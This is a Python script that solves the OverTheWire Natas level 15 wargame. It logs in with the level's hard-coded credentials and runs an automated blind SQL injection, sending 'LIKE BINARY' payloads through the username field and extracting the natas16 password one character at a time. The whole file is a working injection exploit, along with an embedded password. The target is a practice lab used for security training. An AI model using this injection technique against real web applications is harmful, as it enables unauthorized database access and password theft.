#!/usr/bin/env python3
import httplib2
import urllib
 
h = httplib2.Http()
h.add_credentials('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
 
pswdSoFar = "";
chars = ''.join([chr(i) for i in range(128)]).replace('%','').replace('_','')[::-1]
i = 0
while i < len(chars):
    query = urllib.parse.urlencode(dict(username="natas16\" AND password LIKE BINARY \"" + pswdSoFar + chars[i] + "%\" ;# "))
    resp, content = h.request("http://natas15.natas.labs.overthewire.org/index.php?" + query, method="POST")
    if ("This user exist" in str(content)):
        pswdSoFar += chars[i];
        print("New Password: " + pswdSoFar)
        i = 0
        continue
    i += 1
print("Password is: "+pswdSoFar)
